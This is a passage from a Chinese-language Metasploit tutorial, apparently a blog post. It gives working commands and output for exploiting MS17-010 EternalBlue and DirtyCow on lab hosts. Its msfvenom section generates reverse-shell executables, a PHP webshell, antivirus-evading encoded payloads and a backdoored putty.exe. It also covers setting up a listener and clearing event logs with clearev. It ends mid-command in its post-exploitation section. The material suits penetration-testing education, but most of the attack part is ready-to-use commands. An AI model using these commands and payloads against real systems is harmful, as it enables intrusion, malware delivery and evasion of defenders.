+<td><code>use exploit/windows/smb/ms17_010_eternalblue</code></td>
+</tr>
+<tr>
+<td><code>show options</code></td>
+<td>查看当前模块的配置选项</td>
+<td><code>show options</code></td>
+</tr>
+<tr>
+<td><code>show payloads</code></td>
+<td>查看可用 Payload</td>
+<td><code>show payloads</code></td>
+</tr>
+<tr>
+<td><code>show targets</code></td>
+<td>查看可用目标类型</td>
+<td><code>show targets</code></td>
+</tr>
+<tr>
+<td><code>show info</code></td>
+<td>查看模块详细信息</td>
+<td><code>show info</code></td>
+</tr>
+<tr>
+<td><code>set</code></td>
+<td>设置参数值</td>
+<td><code>set RHOSTS 192.168.1.100</code></td>
+</tr>
+<tr>
+<td><code>setg</code></td>
+<td>全局设置参数（对所有模块生效）</td>
+<td><code>setg LHOST 192.168.1.7</code></td>
+</tr>
+<tr>
+<td><code>unset</code></td>
+<td>取消某个参数</td>
+<td><code>unset RHOSTS</code></td>
+</tr>
+<tr>
+<td><code>get</code></td>
+<td>查看某个参数的值</td>
+<td><code>get LHOST</code></td>
+</tr>
+<tr>
+<td><code>back</code></td>
+<td>退出当前模块</td>
+<td><code>back</code></td>
+</tr>
+<tr>
+<td><code>run</code> &#x2F; <code>exploit</code></td>
+<td>执行当前模块</td>
+<td><code>run</code></td>
+</tr>
+<tr>
+<td><code>sessions</code></td>
+<td>查看所有会话</td>
+<td><code>sessions -l</code></td>
+</tr>
+<tr>
+<td><code>sessions -i</code></td>
+<td>进入指定会话</td>
+<td><code>sessions -i 1</code></td>
+</tr>
+<tr>
+<td><code>db_status</code></td>
+<td>查看数据库连接状态</td>
+<td><code>db_status</code></td>
+</tr>
+<tr>
+<td><code>workspace</code></td>
+<td>管理工作区</td>
+<td><code>workspace -a test</code></td>
+</tr>
+<tr>
+<td><code>exit</code></td>
+<td>退出 MSF</td>
+<td><code>exit</code></td>
+</tr>
+</tbody></table>
+<h3 id="5-3-search-命令详解"><a href="#5-3-search-命令详解" class="headerlink" title="5.3 search 命令详解"></a>5.3 search 命令详解</h3><p><code>search</code> 是 MSF 中使用最频繁的命令之一，它帮你从数千个模块中快速找到需要的模块。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 基本搜索：按关键词搜索</span><br>search eternalblue<br><br><span class="hljs-comment"># 按平台搜索</span><br>search platform:windows smb<br><br><span class="hljs-comment"># 按模块类型搜索</span><br>search <span class="hljs-built_in">type</span>:exploit smb<br><br><span class="hljs-comment"># 按漏洞编号搜索</span><br>search cve:2017-0144<br><br><span class="hljs-comment"># 组合搜索：Windows 平台 excellent 等级的 SMB 漏洞利用</span><br>search platform:windows <span class="hljs-built_in">type</span>:exploit rank:excellent smb<br></code></pre></td></tr></table></figure>
+
+<p><strong>Rank（等级）说明</strong>：MSF 为每个模块标注了质量等级，从高到低：</p>
+<ul>
+<li><code>excellent</code>：成功率极高，几乎不会导致目标崩溃</li>
+<li><code>great</code>：成功率较高，有自动目标检测</li>
+<li><code>good</code>：成功率中等，需要手动指定目标</li>
+<li><code>normal</code>：普通模块</li>
+<li><code>average</code>：一般</li>
+<li><code>low</code>：成功率较低</li>
+</ul>
+<h3 id="5-4-理解模块配置选项"><a href="#5-4-理解模块配置选项" class="headerlink" title="5.4 理解模块配置选项"></a>5.4 理解模块配置选项</h3><p>加载模块后，使用 <code>show options</code> 查看需要配置的参数：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue<br>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options<br><br>Name           Current Setting  Required  Description<br>----           ---------------  --------  -----------<br>RHOSTS                          <span class="hljs-built_in">yes</span>       The target host(s)<br>RPORT          445              <span class="hljs-built_in">yes</span>       The target port (TCP)<br>SMBDomain      .                no        The Windows domain<br>SMBPass                         no        The password <span class="hljs-keyword">for</span> the specified username<br>SMBUser                         no        The username to authenticate as<br>...<br></code></pre></td></tr></table></figure>
+
+<p><strong>关键参数说明</strong>：</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>含义</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>RHOSTS</strong></td>
+<td>目标主机地址</td>
+<td>可填单个 IP 或 IP 段，如 <code>192.168.1.100</code> 或 <code>192.168.1.0/24</code></td>
+</tr>
+<tr>
+<td><strong>RPORT</strong></td>
+<td>目标端口</td>
+<td>目标服务监听的端口</td>
+</tr>
+<tr>
+<td><strong>LHOST</strong></td>
+<td>攻击者主机地址</td>
+<td>你的机器 IP，反弹 Shell 时目标会连接这个地址</td>
+</tr>
+<tr>
+<td><strong>LPORT</strong></td>
+<td>攻击者监听端口</td>
+<td>你的机器监听端口，默认 4444</td>
+</tr>
+<tr>
+<td><strong>PAYLOAD</strong></td>
+<td>使用的载荷</td>
+<td>漏洞利用成功后执行的代码</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="6-渗透测试完整流程"><a href="#6-渗透测试完整流程" class="headerlink" title="6. 渗透测试完整流程"></a>6. 渗透测试完整流程</h2><p>一次完整的渗透测试通常包含以下五个阶段：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">信息收集  →  漏洞发现  →  漏洞利用  →  后渗透  →  清理痕迹<br></code></pre></td></tr></table></figure>
+
+<h3 id="6-1-第一阶段：信息收集"><a href="#6-1-第一阶段：信息收集" class="headerlink" title="6.1 第一阶段：信息收集"></a>6.1 第一阶段：信息收集</h3><p>在攻击之前，必须先了解目标。使用 Auxiliary 模块进行信息收集。</p>
+<p><strong>示例：扫描目标主机的开放端口</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 &gt; use auxiliary/scanner/portscan/tcp<br>msf6 auxiliary(scanner/portscan/tcp) &gt; <span class="hljs-built_in">set</span> RHOSTS 192.168.1.100<br>msf6 auxiliary(scanner/portscan/tcp) &gt; <span class="hljs-built_in">set</span> PORTS 1-1000<br>msf6 auxiliary(scanner/portscan/tcp) &gt; run<br></code></pre></td></tr></table></figure>
+
+<p><strong>示例：探测 SMB 服务版本</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 &gt; use auxiliary/scanner/smb/smb_version<br>msf6 auxiliary(scanner/smb/smb_version) &gt; <span class="hljs-built_in">set</span> RHOSTS 192.168.1.100<br>msf6 auxiliary(scanner/smb/smb_version) &gt; run<br></code></pre></td></tr></table></figure>
+
+<p>输出结果会显示目标的操作系统版本和 SMB 版本，这些信息对后续选择漏洞利用模块至关重要。</p>
+<h3 id="6-2-第二阶段：漏洞发现"><a href="#6-2-第二阶段：漏洞发现" class="headerlink" title="6.2 第二阶段：漏洞发现"></a>6.2 第二阶段：漏洞发现</h3><p>根据信息收集的结果，查找目标系统可能存在的漏洞。</p>
+<p><strong>方法一：在 MSF 中搜索</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 &gt; search smb <span class="hljs-built_in">type</span>:exploit platform:windows<br></code></pre></td></tr></table></figure>
+
+<p><strong>方法二：使用 searchsploit 搜索公开漏洞库</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 在终端中（非 MSF 内）使用</span><br>searchsploit smb windows remote<br></code></pre></td></tr></table></figure>
+
+<p><strong>方法三：使用 Nmap 脚本扫描漏洞</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap --script=vuln 192.168.1.100<br></code></pre></td></tr></table></figure>
+
+<h3 id="6-3-第三阶段：漏洞利用"><a href="#6-3-第三阶段：漏洞利用" class="headerlink" title="6.3 第三阶段：漏洞利用"></a>6.3 第三阶段：漏洞利用</h3><p>选择匹配的 Exploit 模块，配置参数，执行攻击。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue<br>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="hljs-built_in">set</span> RHOSTS 192.168.1.100<br>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="hljs-built_in">set</span> PAYLOAD windows/x64/meterpreter/reverse_tcp<br>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="hljs-built_in">set</span> LHOST 192.168.1.7<br>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="hljs-built_in">set</span> LPORT 4444<br>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; exploit<br></code></pre></td></tr></table></figure>
+
+<h3 id="6-4-第四阶段：后渗透"><a href="#6-4-第四阶段：后渗透" class="headerlink" title="6.4 第四阶段：后渗透"></a>6.4 第四阶段：后渗透</h3><p>获得 Shell 后，进行信息收集、权限提升、数据窃取等操作。详见<a href="#10-%E5%90%8E%E6%B8%97%E9%80%8F%E6%93%8D%E4%BD%9C%E8%AF%A6%E8%A7%A3">第10节</a>。</p>
+<h3 id="6-5-第五阶段：清理痕迹"><a href="#6-5-第五阶段：清理痕迹" class="headerlink" title="6.5 第五阶段：清理痕迹"></a>6.5 第五阶段：清理痕迹</h3><p>完成测试后，清除操作痕迹。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 在 Meterpreter 会话中清除 Windows 事件日志</span><br>meterpreter &gt; clearev<br><br><span class="hljs-comment"># 删除上传的文件</span><br>meterpreter &gt; <span class="hljs-built_in">rm</span> C:\\temp\\payload.exe<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="7-实战案例一：Windows-漏洞利用（MS17-010）"><a href="#7-实战案例一：Windows-漏洞利用（MS17-010）" class="headerlink" title="7. 实战案例一：Windows 漏洞利用（MS17-010）"></a>7. 实战案例一：Windows 漏洞利用（MS17-010）</h2><h3 id="7-1-背景介绍"><a href="#7-1-背景介绍" class="headerlink" title="7.1 背景介绍"></a>7.1 背景介绍</h3><p>MS17-010（又称永恒之蓝&#x2F;EternalBlue）是 2017 年曝出的 Windows SMBv1 协议远程代码执行漏洞，影响 Windows 7、Windows Server 2008 R2 等未打补丁的系统。2017 年的 WannaCry 勒索病毒正是利用此漏洞传播。</p>
+<h3 id="7-2-实验环境"><a href="#7-2-实验环境" class="headerlink" title="7.2 实验环境"></a>7.2 实验环境</h3><table>
+<thead>
+<tr>
+<th>角色</th>
+<th>系统</th>
+<th>IP 地址</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>攻击机</td>
+<td>Kali Linux（MSF）</td>
+<td>192.168.1.7</td>
+</tr>
+<tr>
+<td>靶机</td>
+<td>Windows 7 SP1（无补丁）</td>
+<td>192.168.1.100</td>
+</tr>
+</tbody></table>
+<h3 id="7-3-详细步骤"><a href="#7-3-详细步骤" class="headerlink" title="7.3 详细步骤"></a>7.3 详细步骤</h3><p><strong>步骤 1：启动 MSF 并启动数据库</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> service postgresql start<br>msfconsole<br></code></pre></td></tr></table></figure>
+
+<p><strong>步骤 2：搜索 MS17-010 相关模块</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 &gt; search ms17-010<br></code></pre></td></tr></table></figure>
+
+<p>你会看到多个相关模块，其中 <code>auxiliary/scanner/smb/smb_ms17_010</code> 用于检测漏洞是否存在，<code>exploit/windows/smb/ms17_010_eternalblue</code> 用于漏洞利用。</p>
+<p><strong>步骤 3：先检测漏洞是否存在</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 &gt; use auxiliary/scanner/smb/smb_ms17_010<br>msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; <span class="hljs-built_in">set</span> RHOSTS 192.168.1.100<br>msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; run<br></code></pre></td></tr></table></figure>
+
+<p>如果输出显示 <code>Host is likely VULNERABLE to MS17-010!</code>，说明目标存在漏洞，可以继续攻击。</p>
+<p><strong>步骤 4：加载漏洞利用模块</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue<br></code></pre></td></tr></table></figure>
+
+<p><strong>步骤 5：查看模块选项</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options<br></code></pre></td></tr></table></figure>
+
+<p><strong>步骤 6：配置参数</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 设置目标 IP</span><br>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="hljs-built_in">set</span> RHOSTS 192.168.1.100<br><br><span class="hljs-comment"># 设置目标端口（SMB 默认 445）</span><br>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="hljs-built_in">set</span> RPORT 445<br><br><span class="hljs-comment"># 选择 Payload（64位 Meterpreter 反弹连接）</span><br>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="hljs-built_in">set</span> PAYLOAD windows/x64/meterpreter/reverse_tcp<br><br><span class="hljs-comment"># 设置攻击机 IP</span><br>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="hljs-built_in">set</span> LHOST 192.168.1.7<br><br><span class="hljs-comment"># 设置攻击机监听端口</span><br>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="hljs-built_in">set</span> LPORT 4444<br></code></pre></td></tr></table></figure>
+
+<p><strong>步骤 7：再次确认配置</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options<br></code></pre></td></tr></table></figure>
+
+<p>确认 RHOSTS、LHOST、PAYLOAD 等参数都正确设置。</p>
+<p><strong>步骤 8：执行攻击</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; exploit<br></code></pre></td></tr></table></figure>
+
+<p><strong>步骤 9：攻击成功</strong></p>
+<p>如果攻击成功，你会看到以下输出：</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs dns">[*] Started reverse TCP handler on <span class="hljs-number">192.168.1.7</span>:<span class="hljs-number">4444</span><br>[*] <span class="hljs-number">192.168.1.100</span>:<span class="hljs-number">445</span> - Executing automatic check...<br>[+] <span class="hljs-number">192.168.1.100</span>:<span class="hljs-number">445</span> - The target is vulnerable.<br>[*] <span class="hljs-number">192.168.1.100</span>:<span class="hljs-number">445</span> - Sending exploit...<br>[*] Sending stage <span class="hljs-punctuation">(</span><span class="hljs-number">200774</span> bytes<span class="hljs-punctuation">)</span> to <span class="hljs-number">192.168.1.100</span><br>[*] Meterpreter session <span class="hljs-number">1</span> opened <span class="hljs-punctuation">(</span><span class="hljs-number">192.168.1.7</span>:<span class="hljs-number">4444</span> -&gt; <span class="hljs-number">192.168.1.100</span>:<span class="hljs-number">49160</span><span class="hljs-punctuation">)</span><br><br>meterpreter &gt;<br></code></pre></td></tr></table></figure>
+
+<p>现在你已经获得了目标主机的 <strong>Meterpreter</strong> 会话，可以执行后续操作了。</p>
+<h3 id="7-4-可能遇到的问题"><a href="#7-4-可能遇到的问题" class="headerlink" title="7.4 可能遇到的问题"></a>7.4 可能遇到的问题</h3><table>
+<thead>
+<tr>
+<th>问题</th>
+<th>可能原因</th>
+<th>解决方法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>目标不可达</td>
+<td>网络不通或防火墙拦截</td>
+<td>检查网络连接，确认能 ping 通目标</td>
+</tr>
+<tr>
+<td>Payload 类型不匹配</td>
+<td>目标系统架构与 Payload 不一致</td>
+<td>尝试 <code>windows/meterpreter/reverse_tcp</code>（32位）</td>
+</tr>
+<tr>
+<td>目标不可利用</td>
+<td>已打补丁或 SMBv1 已禁用</td>
+<td>确认目标确实存在 MS17-010 漏洞</td>
+</tr>
+<tr>
+<td>会话建立后立即断开</td>
+<td>杀毒软件或防火墙拦截</td>
+<td>关闭目标防火墙或更换 Payload</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="8-实战案例二：Linux-提权（DirtyCow）"><a href="#8-实战案例二：Linux-提权（DirtyCow）" class="headerlink" title="8. 实战案例二：Linux 提权（DirtyCow）"></a>8. 实战案例二：Linux 提权（DirtyCow）</h2><h3 id="8-1-背景介绍"><a href="#8-1-背景介绍" class="headerlink" title="8.1 背景介绍"></a>8.1 背景介绍</h3><p>DirtyCow（CVE-2016-5195）是 Linux 内核中的一个竞态条件漏洞，影响 2007 年至 2016 年间发布的几乎所有 Linux 发行版。它允许低权限用户提升到 root 权限。</p>
+<h3 id="8-2-实验场景"><a href="#8-2-实验场景" class="headerlink" title="8.2 实验场景"></a>8.2 实验场景</h3><p>你已经通过 SSH 弱口令拿到了一台 Ubuntu 16.04 服务器的普通用户 Shell，现在需要提权到 root。</p>
+<h3 id="8-3-详细步骤"><a href="#8-3-详细步骤" class="headerlink" title="8.3 详细步骤"></a>8.3 详细步骤</h3><p><strong>步骤 1：在 MSF 中搜索 DirtyCow 模块</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 &gt; search dirtycow<br></code></pre></td></tr></table></figure>
+
+<p><strong>步骤 2：加载提权模块</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 &gt; use exploit/linux/local/dirtycow<br></code></pre></td></tr></table></figure>
+
+<p><strong>步骤 3：查看模块信息</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 exploit(linux/local/dirtycow) &gt; show info<br></code></pre></td></tr></table></figure>
+
+<p><strong>步骤 4：配置参数</strong></p>
+<p>首先，你需要有一个已存在的会话（例如通过 SSH 登录获得的 Shell）。假设你的会话 ID 是 1：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 exploit(linux/local/dirtycow) &gt; <span class="hljs-built_in">set</span> SESSION 1<br>msf6 exploit(linux/local/dirtycow) &gt; <span class="hljs-built_in">set</span> PAYLOAD linux/x64/meterpreter/reverse_tcp<br>msf6 exploit(linux/local/dirtycow) &gt; <span class="hljs-built_in">set</span> LHOST 192.168.1.7<br>msf6 exploit(linux/local/dirtycow) &gt; <span class="hljs-built_in">set</span> LPORT 5555<br></code></pre></td></tr></table></figure>
+
+<p><strong>步骤 5：执行提权</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 exploit(linux/local/dirtycow) &gt; run<br></code></pre></td></tr></table></figure>
+
+<p>如果成功，你将获得一个 root 权限的新 Meterpreter 会话。</p>
+<p><strong>步骤 6：验证权限</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; getuid<br>Server username: root<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="9-msfvenom：Payload-生成工具"><a href="#9-msfvenom：Payload-生成工具" class="headerlink" title="9. msfvenom：Payload 生成工具"></a>9. msfvenom：Payload 生成工具</h2><p><code>msfvenom</code> 是 MSF 内置的 Payload 生成工具，可以生成各种格式的木马程序。它替代了旧版的 <code>msfpayload</code> 和 <code>msfencode</code> 工具。</p>
+<h3 id="9-1-基本语法"><a href="#9-1-基本语法" class="headerlink" title="9.1 基本语法"></a>9.1 基本语法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p &lt;payload&gt; [options] -f &lt;format&gt; -o &lt;output_file&gt;<br></code></pre></td></tr></table></figure>
+
+<h3 id="9-2-常用参数"><a href="#9-2-常用参数" class="headerlink" title="9.2 常用参数"></a>9.2 常用参数</h3><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-p</code></td>
+<td>指定 Payload</td>
+<td><code>-p windows/meterpreter/reverse_tcp</code></td>
+</tr>
+<tr>
+<td><code>LHOST=</code></td>
+<td>攻击机 IP</td>
+<td><code>LHOST=192.168.1.7</code></td>
+</tr>
+<tr>
+<td><code>LPORT=</code></td>
+<td>攻击机端口</td>
+<td><code>LPORT=4444</code></td>
+</tr>
+<tr>
+<td><code>-f</code></td>
+<td>输出格式</td>
+<td><code>-f exe</code>、<code>-f elf</code>、<code>-f raw</code>、<code>-f python</code></td>
+</tr>
+<tr>
+<td><code>-o</code></td>
+<td>输出文件</td>
+<td><code>-o shell.exe</code></td>
+</tr>
+<tr>
+<td><code>-e</code></td>
+<td>指定编码器</td>
+<td><code>-e x86/shikata_ga_nai</code></td>
+</tr>
+<tr>
+<td><code>-i</code></td>
+<td>编码次数</td>
+<td><code>-i 5</code></td>
+</tr>
+<tr>
+<td><code>-a</code></td>
+<td>指定架构</td>
+<td><code>-a x86</code>、<code>-a x64</code></td>
+</tr>
+<tr>
+<td><code>--platform</code></td>
+<td>指定平台</td>
+<td><code>--platform windows</code>、<code>--platform linux</code></td>
+</tr>
+<tr>
+<td><code>-l</code></td>
+<td>列出可用模块</td>
+<td><code>-l payloads</code>、<code>-l encoders</code></td>
+</tr>
+</tbody></table>
+<h3 id="9-3-实战示例"><a href="#9-3-实战示例" class="headerlink" title="9.3 实战示例"></a>9.3 实战示例</h3><h4 id="示例-1：生成-Windows-反弹-Shell-木马"><a href="#示例-1：生成-Windows-反弹-Shell-木马" class="headerlink" title="示例 1：生成 Windows 反弹 Shell 木马"></a>示例 1：生成 Windows 反弹 Shell 木马</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.7 LPORT=4444 -f exe -o shell.exe<br></code></pre></td></tr></table></figure>
+
+<h4 id="示例-2：生成-Linux-反弹-Shell-木马"><a href="#示例-2：生成-Linux-反弹-Shell-木马" class="headerlink" title="示例 2：生成 Linux 反弹 Shell 木马"></a>示例 2：生成 Linux 反弹 Shell 木马</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.7 LPORT=4444 -f elf -o shell.elf<br></code></pre></td></tr></table></figure>
+
+<h4 id="示例-3：生成-PHP-Webshell"><a href="#示例-3：生成-PHP-Webshell" class="headerlink" title="示例 3：生成 PHP Webshell"></a>示例 3：生成 PHP Webshell</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.7 LPORT=4444 -f raw -o shell.php<br></code></pre></td></tr></table></figure>
+
+<h4 id="示例-4：生成编码后的-Payload（绕过杀毒软件）"><a href="#示例-4：生成编码后的-Payload（绕过杀毒软件）" class="headerlink" title="示例 4：生成编码后的 Payload（绕过杀毒软件）"></a>示例 4：生成编码后的 Payload（绕过杀毒软件）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.7 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded_shell.exe<br></code></pre></td></tr></table></figure>
+
+<h4 id="示例-5：生成嵌入在合法程序中的木马"><a href="#示例-5：生成嵌入在合法程序中的木马" class="headerlink" title="示例 5：生成嵌入在合法程序中的木马"></a>示例 5：生成嵌入在合法程序中的木马</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.7 LPORT=4444 -x putty.exe -k -f exe -o putty_backdoor.exe<br></code></pre></td></tr></table></figure>
+
+<p>其中 <code>-x</code> 指定模板文件（合法程序），<code>-k</code> 表示将 Payload 注入到模板中并保留原程序功能。</p>
+<h4 id="示例-6：查看所有可用-Payload"><a href="#示例-6：查看所有可用-Payload" class="headerlink" title="示例 6：查看所有可用 Payload"></a>示例 6：查看所有可用 Payload</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -l payloads<br></code></pre></td></tr></table></figure>
+
+<h4 id="示例-7：查看所有可用编码器"><a href="#示例-7：查看所有可用编码器" class="headerlink" title="示例 7：查看所有可用编码器"></a>示例 7：查看所有可用编码器</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -l encoders<br></code></pre></td></tr></table></figure>
+
+<h3 id="9-4-监听-Payload-连接"><a href="#9-4-监听-Payload-连接" class="headerlink" title="9.4 监听 Payload 连接"></a>9.4 监听 Payload 连接</h3><p>生成木马后，你需要在攻击机上启动监听器来接收连接：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 &gt; use exploit/multi/handler<br>msf6 exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp<br>msf6 exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> LHOST 192.168.1.7<br>msf6 exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> LPORT 4444<br>msf6 exploit(multi/handler) &gt; exploit<br></code></pre></td></tr></table></figure>
+
+<p><strong>注意</strong>：<code>PAYLOAD</code>、<code>LHOST</code>、<code>LPORT</code> 必须与 <code>msfvenom</code> 生成木马时使用的参数完全一致。</p>
+<hr>
+<h2 id="10-后渗透操作详解"><a href="#10-后渗透操作详解" class="headerlink" title="10. 后渗透操作详解"></a>10. 后渗透操作详解</h2><p>获得 Meterpreter 会话后，可以执行以下操作来巩固控制权并收集信息。</p>
+<h3 id="10-1-基础信息收集"><a href="#10-1-基础信息收集" class="headerlink" title="10.1 基础信息收集"></a>10.1 基础信息收集</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看系统信息</span><br>meterpreter &gt; sysinfo<br><br><span class="hljs-comment"># 查看当前用户</span><br>meterpreter &gt; getuid<br><br><span class="hljs-comment"># 查看网络配置</span><br>meterpreter &gt; 